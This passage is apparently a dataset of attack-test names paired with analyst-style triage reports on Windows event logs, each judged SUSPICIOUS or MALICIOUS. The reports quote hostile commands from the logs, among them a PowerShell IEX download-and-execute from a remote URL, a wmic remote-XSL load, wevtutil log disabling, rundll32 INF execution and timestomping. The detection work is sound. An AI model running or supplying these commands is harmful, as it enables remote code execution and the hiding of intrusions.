#### Network Service Activity:
- There is the standard activity of `sppsvc.exe` and `WmiPrvSE.exe` running under `NETWORK SERVICE`, which is expected in various administrative and system tasks.

### Assessment:
The PowerShell activity, particularly the execution of commands involving registry modifications with random binary data, is highly suspicious. This behavior is often associated with malware or adversarial activities trying to hide or evade detection. Furthermore, the execution of `whoami.exe` and `wevtutil.exe` paired with high integrity levels further raises suspicion about potential malicious reconnaissance or log tampering activities.

### Resolution:
- **SUSPICIOUS**: The activity observed in these logs does not unequivocally confirm malicious behavior but is sufficiently unusual and aligns with tactics often indicative of compromise. Further investigation is warranted, including:
  - Analyzing historic logs for similar activity.
  - Checking for other signs of compromise or unauthorized access on the affected systems.
  - Reviewing user accounts and privileges to ensure no unauthorized or malicious actors are present.
  - Conduct deeper inspection on the machine to see if there have been any unauthorized changes or other signs of intrusion, such as unexplained network traffic. 
  - Consider capturing a memory dump for analysis if live investigation is possible.

This suspicious activity merits a thorough investigation to rule out or confirm any potential compromise."
Regsvr32 Silent DLL Install Call DllRegisterServer,"Upon reviewing the provided Windows event logs, there are several key observations and potential indicators of suspicious behavior:

### Observations:

1. **PowerShell Execution**:
   - There is a log entry indicating that `powershell.exe` was executed under the user `SERVER002\\admin_test`. It's not uncommon for administrators to use PowerShell, but this particular instance was executed shortly before a sequence of questionable events. The command-line arguments or scripts executed were not captured, which is critical information for further analysis.

2. **Use of `wevtutil.exe` and `conhost.exe`**:
   - `wevtutil.exe` and `conhost.exe` were executed multiple times by `SERVER002\\admin_test`. The frequent use of `wevtutil` could potentially indicate attempts to export, clear, or manipulate event logs, which might be an attempt to cover tracks of malicious activities. `conhost.exe` is a legitimate Windows process but seeing it repeatedly in conjunction with other suspicious activities warrants further scrutiny.

3. **Execution of `hostname.exe`, `whoami.exe`, and `cmd.exe`**:
   - These systems utilities were executed, possibly as a means to reconfirm the current environment details or logged-on user context. While they are built-in, their use immediately preceded an execution of `regsvr32.exe`, which appears more concerning.

4. **`regsvr32.exe` Call with DLL Registration**:
   - There was an execution of `regsvr32.exe` to register `AllTheThingsx86.dll` located in a temporary path. This is a significant red flag as `regsvr32.exe` is known for its misuse in executing arbitrary code and downloading malicious content, particularly when loading or registering DLLs from unconventional or temporary directories.

5. **Absence of Security and System Logs**:
   - The lack of entries in the Security and System logs makes it challenging to fully assess the context. Security logs could provide information on account logons, permissions, and possible privilege escalation attempts, which are absent here.

### Assessment:

The sequence of events and the presence of certain tools raise suspicion of potential malicious activity. The use of PowerShell followed by multiple executions of `wevtutil.exe`, registration of a DLL from a suspicious directory using `regsvr32.exe`, and the corresponding lack of context from missing Security and System logs are strong indicators that something is not right.

### Guidance and Resolution:

1. **Further Investigation**:
   - Investigate the purpose of the PowerShell execution and retrieve command-line data or scripts executed.
   - Look into the file `AllTheThingsx86.dll` and analyze its contents or origin.
   - Review additional context from logs across the network to determine if similar activities occurred elsewhere.

2. **Containment Measures**:
   - Limit or monitor network access for `SERVER002` and the user `admin_test`.
   - Consider isolating the host and perform a deeper analysis offline.

3. **Security Enhancements**:
   - Enhance logging, particularly around process creation and command execution.
   - Implement alerting on high-risk tools like `regsvr32.exe` and `powershell.exe` especially from non-standard directories.

**Resolution**: **SUSPICIOUS** - The logs indicate activities that are not typical for standard operations and suggest potential malicious behavior which needs further investigation."
Add Root Certificate to CurrentUser Certificate Store,"**Detailed Analysis of the Logs:**

**PowerShell Activity:**
- The logs indicate the execution of a PowerShell command: `powershell.exe & {IEX (IWR 'https://github.com/file/file-file/raw/master/files/data.004/src/RemoteCertTrust.ps1' -UseBasicParsing)}`.
- This command attempts to download a script from GitHub and execute it using `Invoke-Expression (IEX)`. This is a technique often used in malicious activities to download and execute potentially harmful scripts from the internet.

**Sysmon Logs:**
- Multiple instances of processes like `wevtutil.exe`, `conhost.exe`, and `powershell.exe` running under the user `SERVER002\admin_test` are observed. The presence of PowerShell indicates an unusual activity linked to the command mentioned earlier.
- The combination of executing PowerShell scripts from an external URL and using `IEX` creates a high suspicion of remote code execution.

**Microsoft Edge Update Activity:**
- Multiple instances of `MicrosoftEdgeUpdate.exe` processes running with various command-line arguments, such as `/svc`, `/update`, `/regsvc`, and `/regserver`, are recorded. These updates and installations are frequent and consistent with typical update processes. The SHA256 hashes provided match known Microsoft Edge components.

**Assessment:**
- **Suspicious PowerShell Execution:** The PowerShell command logged evidences a high potential for malicious activity due to its execution of an external script using `IEX`. This method can easily be abused by attackers to execute malicious scripts or payloads.
- **Normal Update Activities:** The logs for Microsoft Edge Update appear consistent with legitimate software update processes and do not, by themselves, show signs of malicious activity.
  
**Situation Assessment:**
The logs contain significant indicators of suspicious activity, specifically the PowerShell execution pattern, consistent with malicious scripting or potential compromise attempts. The events related to Microsoft Edge updates appear normal and without evident signs of compromise.

**Resolution: SUSPICIOUS**

**Threats/Risks Identified:**
- The PowerShell execution pulling scripts from a remote URL poses a potential security threat and could facilitate unauthorized activities on the machine, leading to data breaches or other attacks.

**Guidance on How to Proceed:**
1. **Immediate Containment:** Block and investigate the URL accessed by the PowerShell command. This could prevent further execution of potentially malicious scripts.
2. **Detailed Investigation:** Conduct a thorough review of the system to identify any unauthorized changes or persistent threats installed by the script pulled from the URL.
3. **Review and Educate:** Investigate how and why the script was executed. Conduct security training for users if necessary, and ensure that any configurations allowing such executions are understood and justified.
4. **Apply Security Patches:** Ensure that the system is up-to-date with the latest security patches and that any vulnerability leading to this potential security event is mitigated.
5. **Enable Logging and Alerting:** Increase the granularity of logging for PowerShell events and implement alerting for atypical PowerShell activity patterns.

Based on the indicators of compromise from PowerShell activity, a deeper assessment of the system is vital to ensure no ongoing threat exists."
Invoke HTML Application - JScript Engine with Rundll32 and Inline Protocol Handler,"**Analysis of the Windows Event Logs:**

1. **PowerShell Execution:**
   - Multiple instances of PowerShell are executed (`WindowsPowerShell\\v1.0\\powershell.exe`). Notably, there is an instance with event ID 18061 that runs with the command line: `""powershell.exe"" & {Invoke-ATHHTMLApplication -ScriptEngine JScript -InlineProtocolHandler About -UseRundll32 -Rundll32FilePath $env:windir\\system32\\rundll32.exe}`. 
   - The use of `Invoke-ATHHTMLApplication` is unusual and suggests that PowerShell is being used for script execution in a potentially obfuscated or malicious manner. This should not be part of typical operations, especially on an executive's system.

2. **Unusual Process Activities:**
   - The `wevtutil.exe` utility is spawned multiple times. While `wevtutil.exe` is a legitimate Windows utility used for managing event logs, repeated and unexplained use of this utility could indicate log tampering, typically to cover a trail of malicious activity.

3. **High Integrity Level Processes:**
   - Processes are running with a high integrity level, such as `hostname.exe` and `whoami.exe`, but these are normal Windows utilities. Their execution may not be inherently suspicious in high integrity contexts unless seen in conjunction with other anomalous behaviors.

4. **Console Host (conhost.exe) Instances:**
   - There are multiple `conhost.exe` executions tied to the PowerShell execution. This is expected but should be noted in conjunction with PowerShell's suspicious command.

5. **Installation Activities by SYSTEM:**
   - The execution logs for Microsoft Edge updates (`MicrosoftEdge_X64_130.0.2849.56_129.0.2792.89.exe`) are observed running under the `NT AUTHORITY\\SYSTEM`. While updating processes under the SYSTEM user can be legitimate, monitoring should be maintained because malware sometimes uses updates as a guise for installing unwanted or malicious software.

6. **No Security Log Events:**
   - There is an absence of security events, which could indicate normal system behavior, but might also suggest log cleaning following unauthorized activities. 

**Conclusion:**
- **SUSPICIOUS:** The combination of unusual PowerShell usage with specific command-line arguments, along with repeated use of `wevtutil.exe`, suggests suspicious activity that requires further investigation. 

**Recommended Actions:**
- Conduct deeper analysis on the scripts executed by PowerShell, specifically the use of `Invoke-ATHHTMLApplication`.
- Review the use of `wevtutil.exe` to determine if it aligns with legitimate administrative tasks or potentially malicious log tampering.
- Verify any lasting changes to system settings, application installations, or suspicious file creations that occurred around the times of these logs.
- Ensure endpoint protection and EDR solutions are fully operational and updated.
- Monitor the system for any further signs of suspicious activity and consider isolating the machine if necessary to prevent potential spread or further compromise."
Disable Event Logging with wevtutil,"In analyzing the provided Windows event logs from Server002, a few events stand out due to potential signs of malicious activity:

1. **Time Change Events**: 
   - Multiple Event ID 4616 indicate system time was adjusted backward, with `svchost.exe` being the responsible process. Unexpected time changes might be a tactic to trigger or evade scheduled activities.

2. **Logon Events and Privilege Escalation**:
   - Event ID 4624 shows a successful logon using NTLM authentication from `DESKTOP-3HL5B2P` with IP `192.168.0.102`. 
   - Event ID 4672 indicates that the user `admin_test` received several high privileges, including `SeDebugPrivilege`, which can be used to debug and tamper with system processes, indicating potential privilege escalation.

3. **Unusual Process Activity**:
   - **PowerShell and Command Execution**: Although no specific PowerShell actions were logged in the visible PowerShell section, the Process Log from Sysmon shows the execution of `cmd.exe` with the command-line argument containing `wevtutil sl ""Microsoft-Windows-IKE/Operational"" /e:false`. This command disables a specific log channel, a common method to cover tracks by disabling logs.

4. **High-Integrity Level Processes**:
   - The execution of tools like `whoami.exe` and `hostname.exe` by `admin_test` at a high integrity level indicates possible exploration of system and network environment by an actor with elevated privileges.

5. **Wevtutil Tool Usage**:
   - Repeated invocation of `wevtutil.exe` is unusual outside of system administration tasks and could indicate efforts to manage or tamper with logs to conceal activity.

**Assessment**: Given the suspicious activity, including unexpected time changes, logon activity indicating a potential NTLM lateral movement, privilege escalation, and the use of `wevtutil.exe` to disable logs, the logs suggest potentially malicious behavior.

**Resolution**: SUSPICIOUS

**Recommendations**:
- Conduct further investigation into the origin of the NTLM authentication.
- Review user activity associated with `admin_test`.
- Inspect the system for additional indicators of compromise or malware.
- Consider implementing time synchronization and monitoring for unauthorized time changes in critical systems.
- Re-enable any disabled logs and consider enhancing logging and alerting capabilities to detect such activities.
- Explore network activity for external connections or anomalies coming from the suspect IP address."
System Binary Proxy Execution - Wlrmdr Lolbin,"Based on the provided event logs, here's a detailed analysis:

### Observations:

1. **Usage of System Utilities**: There are multiple instances of `wevtutil.exe` and `conhost.exe` being executed by the user `SERVER002\admin_test`. The use of `wevtutil.exe`, a command-line utility for managing event logs, could be legitimate or used for malicious purposes. The `conhost.exe`, which is a legitimate process related to console windows, appears frequently alongside it.

2. **Unusual PowerShell Execution**: A PowerShell script is executing `wlrmdr.exe` with parameters to ultimately run `calc.exe`. This is particularly suspicious as PowerShell is often used for script execution in attacks, and `wlrmdr.exe` is not a known standard executable. While `calc.exe` is just the Calculator application and not inherently suspicious, it could be used as a test or decoy payload in a malicious script.

3. **Privileges and Logging Details**: The user `admin_test` has multiple high-level privileges (SeDebugPrivilege, SeBackupPrivilege, etc.). Such privileges can be exploited if the account is compromised. There is also logon activity using NTLM authentication, which if unusual, could indicate misconfiguration or potential exploitation.

4. **Processes with SYSTEM Privileges**: Several processes such as `MicrosoftEdgeUpdate.exe` are running with `NT AUTHORITY\SYSTEM` privileges. While this is typically standard for system updates, any unusual appearance of these processes or unexpected update processes should be questioned, particularly if they do not align with standard update times or behaviors.

5. **Time Discrepancies**: There is an odd event indicating a time change on the system (Sysmon and Kernel-General time differences). Time changes can sometimes be used to confuse event timelines in logs, often used by attackers to cover tracks. Consider verifying if this was an expected system adjustment.

### Assessment:

- The extensive usage of PowerShell with an unusual command (`wlrmdr.exe`) to execute `calc.exe` and frequent calls to `wevtutil.exe` are worthy of further investigation.
- The usage of NTLM for authentication should be reviewed as to why it's being used, as it's not the most secure protocol in modern environments.
- The user account `admin_test` is executing these actions; verify if these actions align with typical behavior for this account.

### Threats or Risks Identified:

- Potential misuse of administrative privileges.
- Possible obfuscation or malicious script execution via PowerShell.
- Time synchronization discrepancies that may confuse incident timelines.

### Recommendations and Resolution:

1. **Investigate PowerShell Usage**: Review the command and execution context of `wlrmdr.exe`. This should be verified against known scripts and applications within the environment.
  
2. **Privilege and Authentication Review**: Evaluate the necessity of the privileges assigned to `admin_test` and confirm if NTLM usage is appropriate.

3. **Check Time Adjustments**: Confirm the legitimacy of time adjustments captured in the event logs.

4. **Endpoint Monitoring**: Increase monitoring on `SERVER002` and `admin_test` for any anomalies.

5. **Security Policy Update**: Consider enforcing stricter PowerShell script execution policies and ensuring that logging configurations do not invoke `wevtutil.exe` indiscriminately.

Resolution: **SUSPICIOUS** - The logs contain activity that raises concerns and warrants further investigation to rule out or confirm malicious activities."
Windows - Modify file last modified timestamp with PowerShell,"Upon reviewing the provided Windows event logs, here are my detailed observations and analysis:

### PowerShell Log Analysis

1. **Use of PowerShell for Timestomping**:
   - The logs show multiple PowerShell sessions, where a script is executed to modify the last write time of a file to ""01/01/1970 00:00:00"". This kind of behavior is indicative of ""timestomping"", a technique often used by attackers to alter file timestamps in order to hide malicious activities or make it harder to track changes made by malware.
   - The command used: 
     ```
     powershell.exe & {Get-ChildItem ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\Externalfiles\data.006_timestomp.txt"" | % { $_.LastWriteTime = ""01/01/1970 00:00:00"" }}
     ```

### Sysmon Log Analysis

1. **Frequent Execution of Sysinternal Tools**:
   - Frequent execution of system utilities like `hostname.exe`, `whoami.exe`, and `conhost.exe` was noted, which may just be normal system operations. However, run in quick succession, these could indicate an attempt to gather system and user information post-compromise.
   - `wevtutil.exe` was also executed frequently, a tool used to manage Windows Event logs. This could suggest an attempt to clear logs or configure logging, possibly to cover tracks.

2. **Timestomping Activity**:
   - As corroborated by the PowerShell logs, there is a record of PowerShell being executed with the intent to modify timestamps on files (`timestomp`), which is suspicious and typically associated with attempts to subvert detection mechanisms.

3. **Execution of Microsoft Edge Update**:
   - Multiple executions of the Microsoft Edge Update and Installer binaries are present, which appear normal at first glance as they run under `NT AUTHORITY\SYSTEM`. However, it would be prudent to verify if these updates were scheduled or expected, as this context was not explicitly detailed.

### Summary of Assessment

- **Timestomping and Potential Malicious Activity**: The use of timestomping via PowerShell is definitively suspicious, often associated with malicious activities aimed to obfuscate actions or interfere with forensic investigations.
- **Abnormal Use of Utilities**: While execution of utilities like `HOSTNAME.EXE`, `WEVTUTIL.EXE`, and `WHOAMI.EXE` can occur in legitimate contexts, their rapid sequence and context (alongside the PowerShell script) raise suspicious flags.

### Resolution: **SUSPICIOUS**

Although the logs indeed present evidence of activities that align with tactics often used in malicious operations (such as timestomping), without further evidence or context, it's not categorically ""MALICIOUS"". The situation warrants further investigation:
- **Recommendations**:
  - Conduct a thorough endpoint inspection on `Server002`.
  - Review file modifications and metadata, focusing on those with altered timestamps.
  - Cross-verify the usage and legitimacy of the Edge Update processes.
  - Examine any user or scheduled tasks related to the Sysinternals tools and PowerShell commands.
  - Check for similar unusual activities on other machines within the same network, especially on high-risk user machines like the CEO's.

These steps should help determine if the timestamp modification was a benign action or part of a broader malicious campaign."
WMIC bypass using remote XSL file,"After analyzing the provided Windows event logs, here are my observations:

1. **Frequent Execution of System Utilities:**
   - There are multiple instances of `wevtutil.exe`, `conhost.exe`, `whoami.exe`, `hostname.exe`, and `wmic.exe` being executed by the user `SERVER002\\admin_test` within a very short time frame.
   - While the execution of system utilities like `wevtutil.exe`, `hostname.exe`, and `whoami.exe` can be common and part of normal administrative tasks, the frequency and volume of these executions, especially in a close time span, raise some suspicion.
   - The use of `wmic.exe` with an external URL could potentially be malicious. Command line `\""cmd.exe\"" /c wmic process list /FORMAT:\""https://raw.githubusercontent.com/file/file-file/master/files/data/src/wmicscript.xsl\""` is particularly concerning, indicating potential exfiltration or information gathering from the machine or improper script execution.

2. **Time Manipulation:**
   - The `Microsoft-Windows-Kernel-General` and `Microsoft-Windows-Security-Auditing` logs show that the system time on the machine was changed, which is not typical and suggests possible tampering attempts. 
   - Changing system time can be an indicator of attempts to bypass detection based on log timestamps or circumvent scheduled security measures.

3. **High-Privilege Actions:**
   - The `Security` log entries show a logon session for the user `admin_test` with special privileges such as `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, `SeBackupPrivilege`, etc.
   - These privileges, while possibly necessary for system administration, combined with the rest of the suspicious activities, suggest possible misuse or need for escalation review.

4. **Network Connection from a Desktop Machine:**
   - A logon session was established from a machine named `DESKTOP-3HL5B2P` using NTLM authentication, which might be part of standard operations or might represent lateral movement if unexpected.

**Assessment:**
The combination of frequent utility executions, system time manipulations, special privilege grants, and external script fetching via `wmic.exe` indicates behavior often associated with suspicious activity or initial stages of a compromise.

**Resolution: SUSPICIOUS**

**Guidance on How to Proceed:**
- **Further Investigation:**  
  - Conduct a deeper investigation into the `cmd.exe` execution, particularly the external resource reference in `wmic` execution. Investigate what data may have been accessed or exfiltrated.
  - Validate the necessity and legitimacy of the executed commands and network connections, especially concerning unexpected remote desktop logins and users engaging in administrative tasks.
  - Check for any anomalies around the time change event to ensure it's sanctioned and investigate its potential purpose.
  
- **Mitigation and Prevention:**
  - Monitor and restrict high-privilege actions to confirmed administrative activities.
  - Review and, if needed, tighten policies concerning the execution of scripts from external sources to prevent unauthorized data access or exfiltration.
  - Consider implementing more stringent logging and alerting mechanisms for sensitive operations such as time changes.
  
- **Communication:**  
  - Collaborate with relevant IT and security teams to validate these findings and take appropriate corrective actions.
  - If not already sanctioned, inform the leadership about potential issues and the recommended path forward. 

More detailed evaluation in the context of organizational security policy and operational norms should be conducted to ascertain malicious intent or benign justification of these actions."
DisallowRun Execution Of Certain Applications,"Upon reviewing the provided logs, several observations can be made that point towards suspicious activity. Here's a detailed analysis of the logs:

### Sysmon Log Analysis:
1. **Frequent Execution of `wevtutil.exe` and `conhost.exe`:**
    - The logs indicate repeated execution of `wevtutil.exe` and `conhost.exe` in rapid succession. While `wevtutil.exe` is a legitimate Windows utility for managing event logs, its frequent execution may indicate an attempt to clear or manipulate event logs, which is a common technique used by attackers to cover their tracks. This is particularly suspicious if not associated with regular administrative tasks.

2. **Execution of `cmd.exe` with Registry Modifications:**
    - There's an event showing `cmd.exe` executing commands to modify the registry keys under `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun`. This action attempts to block the execution of crucial system utilities like `regedit.exe` and `cmd.exe`. Such behavior is indicative of an attempt to limit system recovery or administration capabilities, which is a common malicious behavior.

3. **High-Integrity Level for Commands:**
    - The executed processes are running with high integrity levels. This could imply privilege misuse, especially since such registry changes and utility runs are happening.

4. **Use of Process `wsmprovhost.exe`:**
    - `wsmprovhost.exe` is typically used for Windows Remote Management. Its repeated use, as a parent process for execution of other suspicious commands, could imply remote command execution.

### Command Arguments and User Context:
- The activity is being conducted under the user context `SERVER002\admin_test`, which appears to be an administrative user, further raising concerns about the insider threat or compromised user credentials.

### Other Event Log Indicators:
- While the `Application`, `System`, and `Security` logs do not directly indicate malicious activity on their own, the Sysmon log details substantial anomalous activity.

### Conclusion:
Based on the observed behaviors:
- Multiple executions of potentially sensitive commands and registry modifications.
- Use of high-integrity levels and administrative privileges to execute suspicious tasks.
- Attempts to alter system policies to disable key functionalities.

The activities logged are indicative of an active compromise or at least a substantial attempt to manipulate the system's normal operations for malicious purposes.

### Resolution:
- **MALICIOUS**: The logged activities strongly point towards malicious intent or actions.

### Recommended Actions:
1. **Immediate Isolation of the System:** Disconnect `Server002` from the network to prevent further unauthorized actions or spread of potential compromise.
2. **Comprehensive Audit:** Conduct a thorough investigation and digital forensic analysis on `Server002` to identify the extent of the compromise and potential insider threat.
3. **Credential Audit and Reset:** Audit user `SERVER002\admin_test` for any unauthorized access and reset credentials.
4. **Review Policies and Permissions:** Check and tighten all permissions and policies related to the administrative operations to prevent similar incidents.
5. **Implement Additional Monitoring:** Increase monitoring on other systems for similar anomalous behavior."
Mimic Ransomware - Enable Multiple User Sessions,"Based on the provided Windows event logs, here is the analysis of the situation:

### Detailed Analysis:

1. **Process Execution:**
   - We observe several instances of `C:\Windows\System32\wevtutil.exe` and `C:\Windows\System32\conhost.exe` being executed by the user `SERVER002\admin_test`. These events alone are not necessarily malicious as `wevtutil.exe` and `conhost.exe` are legitimate Windows utilities. However, frequent or unusual execution could be suspicious if not typical for this user.
   - The presence of `whoami.exe` and `hostname.exe` execution could be indicative of reconnaissance behavior if performed in quick succession and without expected justification.

2. **Command-line Arguments:**
   - The command `cmd.exe /c reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Winlogon /t REG_DWORD /v AllowMultipleTSSessions /d 1 /f` suggests an attempt to modify the registry to allow multiple terminal service sessions. This change could be used for persistence or lateral movement, which is a suspicious activity without appropriate context.

3. **Parent-Child Relationships:**
   - `cmd.exe` was spawned from `wsmprovhost.exe`, which is a legitimate process for Windows Remote Management (WinRM) hosting provider. Scripts could be running via remote sessions, justifying some unusual log entries, but it requires further context.

4. **Integrity Levels:**
   - Each suspicious process like `cmd.exe` and `reg.exe` was running at a high integrity level, indicating administrative privileges, which could increase risks if these were operations conducted by an unauthorized individual.

5. **Time Synchronization:**
   - The timestamps do not suggest any time anomaly manipulation, and the system logs appear typical for time synchronization.

### Assessment:

- **Suspicious Behavior:**
  - The registry edit to allow multiple terminal service sessions is unexplained and executed with admin privileges. The sequence of commands could indicate script execution designed for persistence or exploration of the system.
  - Reconnaissance-like behavior can be concluded from the command executions like `whoami.exe` and `hostname.exe`.

### Resolution:

Given the analysis, the activity observed in the logs does not categorically confirm malicious intent without additional context or evidence but does contain elements typically associated with suspicious activity. Further investigation is recommended to understand the intent and authorization for the observed actions.

**Final Resolution: SUSPICIOUS**

### Recommendations:

- **Conduct User Interview:**
  - Engage the user `admin_test` to determine if the activities were authorized and aligned with their job responsibilities.

- **Investigate Further:**
  - Review other logs (if available) for signs of unauthorized access or breach.
  - Verify if similar registry changes have been made on other systems to assess if this is an isolated case or indicative of a broader issue.
  
- **Consider Enhances Monitoring:**
  - Increase logging and monitoring of registry changes and command-line execution on high-profile systems such as the CEO's machine.

This analysis provides a preliminary assessment that points towards potential suspicion but not outright confirmation of malicious activity. Further investigation into privileges, user intentions, and access history is important to clarify these findings."
Rundll32 ieadvpack.dll Execution,"Upon analyzing the provided Windows event logs, there are certain activities that require attention to determine if they are indicative of suspicious or malicious activity:

1. **PowerShell Execution**: The logs show the execution of PowerShell (`C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`) by a user with admin-like privileges (`SERVER002\\admin_test`). This is often leveraged by malicious actors to execute scripts and further compromise a system. However, the details of the scripts or commands executed are not provided, so we need further investigation to assess the nature of the activity.

2. **Wevtutil Execution**: Multiple instances of `wevtutil.exe` are recorded. This executable is used to manage event logs. Frequent use within a short period under the same account (`SERVER002\\admin_test`) can be a sign of log clearing or manipulation, a tactic used by malicious actors to cover tracks.

3. **Rundll32 Command Execution**: A suspicious command via `cmd.exe` is observed: `""cmd.exe"" /c rundll32.exe ieadvpack.dll,LaunchINFSection ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.011\src\data.011.inf"",DefaultInstall_SingleUser,1,`. The use of `rundll32` in this manner, pointing to a `.inf` file in a temporary path, is indicative of potentially malicious activity, such as the installation of malware or execution of harmful scripts.

4. **Normal System and Application Processes**: Other entries, such as processes related to Microsoft Edge updates, security services, and system health services, seem routine and are likely part of regular update and maintenance activities.

5. **Security and Privilege Events**: The `4672` events logged indicate that a user (SYSTEM) has been granted special privileges. While this is typical for certain system operations, in conjunction with the observed command activity, it heightens the potential for privilege escalation or further unauthorized activity.

**Assessment**:
- **Suspicious Activity**: While the logs contain typical system operations, the presence of PowerShell and `rundll32` executions associated with path and command-line arguments are suspicious.
- The rapid succession of process creations and terminations involving tools for system and log management also warrants further inquiry.

**Resolution**: **SUSPICIOUS**

**Guidance**:
1. **Investigate**:
   - Examine the PowerShell command history for any unusual or unauthorized scripts or commands.
   - Review the `wevtutil` commands to understand their purpose—especially if there's any evidence of event log tampering.
   - Analyze the `rundll32` commands further, checking the content referenced and its origin within the system, to ensure it is legitimate or if it’s part of an attack vector.

2. **Isolation**:
   - Consider temporarily isolating the system from the network to prevent potential spreading or further communication while the investigation is underway.

3. **Monitoring**:
   - Increase monitoring of this host for further suspicious activity and deploy stricter logging to capture detailed information about the power user account (`SERVER002\\admin_test`).

4. **Remediation**:
   - Based on findings, follow through with necessary remediation steps, which could include system cleaning, patching any vulnerabilities discovered, and reinforcing access control measures.

5. **Forensic Analysis**:
   - If any malicious activity is confirmed, conduct a full forensic analysis to identify the breach's scope and take appropriate legal or organizational actions."
Create Hidden Directory via $index_allocation,"Upon analysis of the given logs, here are the findings:

1. **Security Log Events**: The security logs mainly show a change in system time by the `svchost.exe` process under the `LOCAL SERVICE` account. This could potentially indicate tampering, but `svchost.exe` performing time adjustments is generally not alarming on its own if no other suspicious activities accompany it.

2. **Sysmon Log Events**: Several interesting activities can be found:
   - **Process Executions**:
     - `hostname.exe`, `whoami.exe`, `wevtutil.exe` are executed multiple times in quick succession. These tools are legitimate but their usage could indicate attempts to gather information about the environment and users, or potentially clear event logs if used maliciously.
     - A notable command involves `cmd.exe` creating and writing to an alternate data stream (ADS) with the path `%temp%\...$.......::$index_allocation\secrets.txt`. This command is highly suspicious as using ADS in Windows is a known technique for hiding data or malware.
   - **Process Integrity and User Context**: Most processes were run with high integrity level and under the `admin_test` user. This suggests that the user has elevated privileges and potentially administrative rights.
   - **Command-line Arguments**: Command-line arguments align with actions that may be illicit. The manipulation of ADS with `cmd.exe` stands out distinctly for being external to typical administrative tasks.

3. **System and Application Logs**: No abnormal activities are detected in these logs that correlate directly with the potential issues identified in the Sysmon logs.

**Assessment**:
- The usage of alternate data streams (ADS) for data hiding, especially with an obscure file name like `...$.......::$index_allocation`, coupled with the output to a file named `secrets.txt`, is strongly indicative of malicious behavior.
- Frequent use of system tools (`hostname`, `whoami`, `wevtutil`) could suggest reconnaissance or tampering with event logs, particularly if the intent was to hide tracks.

**Threats/Risks**:
- Potential data exfiltration or preparation for further compromise due to the suspicious use of ADS.
- Possible tampering of security logs or data gathering for privilege escalation.

**Guidance and Resolution**:
- Immediate investigation of the user account `admin_test` and any associated actions around the time of these events.
- Review for other uses of ADS on the system, as well as a full check for the presence of hidden or suspicious files.
- Isolate the system if any further signs of compromise are detected to prevent further potential malicious activities.

Final Resolution: **MALICIOUS**

The observed activity highlights behaviors that are clearly indicative of malicious intent, particularly with the manipulation of alternate data streams in a manner used in attacks to hide data."
Hide Windows Clock Group Policy Feature,"Upon reviewing the provided logs from your investigation, here's a detailed analysis:

### Suspicious or Anomalous Behavior:

1. **Excessive Use of `wevtutil.exe`**:
   - The `wevtutil.exe` process is invoked multiple times in a short period. This utility is typically used for managing event logs, but in an anomaly or with malicious intent, it could be used to clear or tamper with the logs to cover tracks.

2. **Registry Modification via `cmd.exe`**:
   - The command `cmd.exe /c reg add ""HKEY_CURRENT_USER...` is executed, which modifies the Windows Registry. This specific modification, setting `HideClock`, is suspicious as attackers might tamper with UI elements to hide changes or alerts.

3. **Usage of Various System Utilities**:
   - Processes such as `whoami.exe` and `hostname.exe` are run. These are often used by attackers to gather information about the system and the current user context.

4. **High Frequency EdgeUpdate Executions**:
   - Multiple instances and frequent execution of `MicrosoftEdgeUpdate.exe` and its related components like `MicrosoftEdgeUpdateSetup.exe` and `MicrosoftEdgeUpdateComRegisterShell64.exe`. Although these processes are typical of legitimate updates, the frequency and the patterns could indicate an attempt for under-the-radar communication or updates outside normal scheduled tasks.

### Malicious Activity or Compromise Indicators:

- The registry modification is the most concerning activity, as unauthorized registry changes can indicate an initial step of a persistent compromise or an attempt to hide malicious operations.

### Assessment and Guidance:

- The logs exhibit signs of potentially suspicious activity, notably the frequent `wevtutil.exe` executions and the registry modification. While no definitive malicious action is evident without further context (e.g., external network connections, persistence mechanisms, other system anomalies), these actions warrant further investigation.

### Resolution:

**SUSPICIOUS**: The behaviors observed require further analysis to determine whether they indicate compromise. The registry modification and use of system tools could be benign in standard maintenance scenarios but could also be part of a malicious playbook.

#### Recommended Actions:

1. Conduct a full malware and antivirus scan on the system to check for known threats.
2. Review user activity and permissions specifically around the `SERVER002\admin_test` user to confirm that activities match legitimate actions.
3. Investigate any network logs or external communications related to the box for signs of data exfiltration or unauthorized access.
4. Validate scheduled tasks and update mechanisms to ensure the legitimate operation of EdgeUpdate services.
5. Consider implementing tighter monitoring of registry changes and unusual process execution.

These steps will guide the analysis to confirm if there is active malicious intent or if these are isolated benign occurrences."
WMI Win32_Product Class - Execute Local MSI file with an embedded DLL,"Upon reviewing the provided logs, certain activities warrant a closer examination.

### Suspicious and Potentially Malicious Activities:

1. **PowerShell Execution:**
   - Multiple instances of PowerShell execution are logged. Notably, there is an invocation of `Invoke-CimMethod` to install a package from a path within the `C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.007\bin\` directory, seen in the command:
     ```
     powershell.exe & {Invoke-CimMethod -ClassName Win32_Product -MethodName Install -Arguments @{ PackageLocation = 'C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.007\\bin\\data.007_DLL.msi' }}
     ```
   - The usage of PowerShell to run CIM commands can be indicative of attempts to install potentially unauthorized software, or execute commands in a more stealthy manner.

2. **Use of `Install Method`:**
   - `Invoke-CimMethod` with `Install` for `Win32_Product` appears to attempt to install something silently, which is unusual unless conducted by authorized administration activities. 

3. **Command Line Arguments:**
   - Another PowerShell execution without prompts (`-nop”) uses:
     ```
     powershell.exe -nop -Command Write-Host CustomAction export executed me; exit
     ```
   - The above command seems to be used for a custom action script, which can be part of post-exploitation to maintain persistence or conduct lateral movements.

4. **Presence in Temporary Directory:**
   - Conducting installations from a temporary directory (`C:\Users\ADMIN_~1\AppData\Local\Temp`) is unusual for legitimate software installations, suggesting use of possibly obfuscated or covert software execution.

### Other Observations:

- **Microsoft Edge Update Activity:**
  - Various entries show Microsoft Edge Update activities. This includes services stopping and starting, which could be part of legitimate update activity, although repeated starts and stops can sometimes suggest tampering or dysfunction.

### Assessment:

Given the execution of PowerShell with potential security-evading flags, installing packages from temporary directories, and lack of immediate evidence of benign intents or supporting documentation, the activity detailed in the logs can be deemed **SUSPICIOUS**.

### Resolution and Recommendations:

- **Further Investigation:**
